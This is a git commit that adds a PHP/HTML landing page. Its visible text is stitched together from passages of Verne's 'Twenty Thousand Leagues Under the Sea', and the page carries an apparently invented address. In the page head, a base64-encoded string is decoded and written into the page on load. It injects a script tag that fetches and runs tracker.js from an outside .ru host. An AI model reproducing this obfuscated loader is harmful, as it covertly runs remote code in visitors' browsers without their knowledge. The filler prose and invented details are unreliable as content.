62fd86b47338775601e7432dc6bdf9906d7715ab
tnakdvao <77594115+tnakdvao@users.noreply.github.com>
2021-01-18 02:13:46 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Agreed! And now, Ned, will you tell me what you mean by a favorab</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl81bmRoYnlwc2p4ZnN3dnI1YjkiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="z7tmt7hs8q3bbugjuw1c">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="ky5f22u6ikf7br7nkct">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Agreed! And now, Ned, will you tell me what you mean by a favorab</h1>
+	</section>
+
+
+	<section class="our-work" class="d3hsrcckdez0chcjbb6g29">
+		<h3 class="title">Over our feet, like coveys of snipe in a bog, rose </h3>
+		<p>I would have cried out. But what good would it have been at such a distance? My swollen lips could utter no sounds. Conseil could articulate some words, and I heard him repeat at intervals, Help! Help! Sir, continued Ned, let us suppose an impossibility; if Captain Nemo should this day offer you your liberty, would you accept it? Where are we? I asked. It is excellent, said I, but it is not tobacco.</p>
+		<hr>
+
+		<ul class="grid" class="vdd6pbu29bh0ahz3do">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="z7tmt7hs8q3bbugjuw1c">
+		<h3 class="title">That seems to me exaggeration. These creat</h3>
+		<p>Oh, confound it! cried Ned Land, kicking the resounding plate. Open, you inhospitable rascals! The same, sir, who is seeking his prize! replied the Canadian. Well? continued Captain Nemo. What is that ship, Ned?</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="ky5f22u6ikf7br7nkct" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="vdd6pbu29bh0ahz3do" class="title">The latter came now and then to the surface to breathe. Its wou</h3>	
+		<p>Thus I only knew we were near the island of Carpathos, one of the Sporades, by Captain Nemo reciting these lines from Virgil: Be quiet, Master Land; and you, professor, will you be so good as to listen to me? But everywhere the slave has the right to regain his liberty. The Atlantic! A vast sheet of water, whose superficial area covers twenty-five millions of square miles, the length of which is nine thousand miles, with a mean breadth of two thousand seven hundred-an ocean whose parallel winding shores embrace an immense circumference, watered by the largest rivers of the world, the St. Lawrence, the Mississippi, the Amazon, the Plata, the Orinoco, the Niger, the Senegal, the Elbe, the Loire, and the Rhine, which carry water from the most civilized, as well as from the most savage countries! Magnificent field of water, incessantly plowed by vessels of every nation, sheltered by the flags of every nation, and which terminates in those two terrible points so dreaded by mariners, Cape Horn, and the Cape of Tempests!</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="z7tmt7hs8q3bbugjuw1c">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="ky5f22u6ikf7br7nkct"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="d3hsrcckdez0chcjbb6g29"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="vdd6pbu29bh0ahz3do"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>03885 Demond Dale, Apt. 794, 62503-1095, Moorechester, Rhode Island, United States</p>
+	</footer>
+
+</body>
+
+</html>
